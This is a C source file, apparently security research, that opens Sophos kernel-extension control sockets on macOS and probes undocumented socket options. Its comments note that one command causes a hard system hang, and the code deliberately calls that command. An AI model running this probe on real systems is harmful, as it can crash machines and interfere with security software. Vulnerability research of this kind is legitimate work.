#include <stdio.h>
#include <strings.h> // For bzero
#include <sys/socket.h>
#include <sys/sys_domain.h>
#include <sys/kern_control.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define OAS_SET_CHARDEV_PING       0
#define OAS_SET_MEMCPY             1
#define OAS_SET_SECRET_KEY         2
#define OAS_SET_IMMEDIATE_EXIT     3
#define OAS_SET_LOG_LEVEL          4
#define OAS_SET_DIAGNOSTICS_ENABLE 5

#define OAS_GET_KEXT_SCHEMA_LEVEL  1
#define OAS_GET_KEXT_LOG_LEVEL     2

#define SWI_SET_UNKNOWN            1
#define SWI_SET_SECRET             5 // Found used in ServiceManager?
// XXX: Investigate more
// Seems to cause Illegal instruction 4 and also Segementation fault 11
#define SWI_GET_SOCKET_INFO        0 // Causes hard system hang
/*
 * Pass this as the command, also
 * pass in an empty size_t object which
 * will be returned with the port number
 */
#define SWI_GET_REDIRECT_PORT      1
/*
 * Pass this as the command, also
 * pass in an empty size_t object which
 * will be returned with the log level value
 */
#define SWI_GET_KEXT_LOG_LEVEL     2
/*
 * Pass this as the command, also
 * pass in an empty size_t object which
 * will be returned with the schema value
 */
#define SWI_GET_KEXT_SCHEMA_LEVEL  3
/*
 * Pass this as the command, also
 * pass in an empty size_t object which
 * will be returned with the mbuf queue size
 */
#define SWI_GET_KEXT_MBUF_QUEUE    4

int main() {
  int result = -1;

  printf("[*] Sophos fun...\n");

  // Create a socket
  int fd = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);
  if (fd != -1) {
    // Initialize the address structure
    struct sockaddr_ctl addr;
    bzero(&addr, sizeof(addr));
    addr.sc_len = sizeof(addr);
    addr.sc_family = AF_SYSTEM;
    addr.ss_sysaddr = AF_SYS_CONTROL;

    // create and initialize the info structure
    struct ctl_info info;
    bzero(&info, sizeof(info));
    
    // Web sockets : com.sophos.nke.swi
    // OaS: com.sophos.kext.oas
    //strncpy(info.ctl_name, "com.sophos.kext.oas", sizeof(info.ctl_name));
    strncpy(info.ctl_name, "com.sophos.nke.swi", sizeof(info.ctl_name));
    result = ioctl(fd, CTLIOCGINFO, &info);
    if (result) {
      printf("[!] Could not get ID for kernel control.\n");
    } else {

      // Set address socket id
      addr.sc_id = info.ctl_id;
      addr.sc_unit = 0;

      // Connect to the socket
      result = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
      if (result) {
	fprintf(stderr, "[!] connect failed %d\n", result);
      } else {
	printf("[+] result = 0x%02x\n", result);
	// getsockopt swi command 3 for getting expected schema : returns 6
	// getsockopt oas command 1 for getting expected schema : returns 7
	size_t o;
	bzero(&o, sizeof(o));
	socklen_t len = sizeof(size_t);
	result = getsockopt(fd, SO_ACCEPTCONN, SWI_GET_SOCKET_INFO, &o, &len);
	if (result){
	  fprintf(stderr, "[!] getsockopt failed on cmd call - result was %d\n", result);
	} else {
	  printf("[+] getsockopt success : 0x%02x\n", o);
	}
      }

      //char *secret = "3";
      //socklen_t len = sizeof(secret);

      int optval;
      int optlen;
      //      char *optval2;
      optval = 123;
      //      setsockopt(fd, SOL_SOCKET, 1, secret, len);
      result = setsockopt(fd, SYSPROTO_CONTROL, 6, &optval, sizeof optval);
      if (result){
	fprintf(stderr, "[!] setsockopt failed on cmd call - result was %d\n", result);
      } else {
	printf("[+] setsockopt success : 0x%02x\n", result);
      }

    }
    printf("[-] Closing socket...\n");
    if(close(fd)) {
      fprintf(stderr, "[!] close failed\n");
    }
  }
  printf("[-] Done...\n");
}
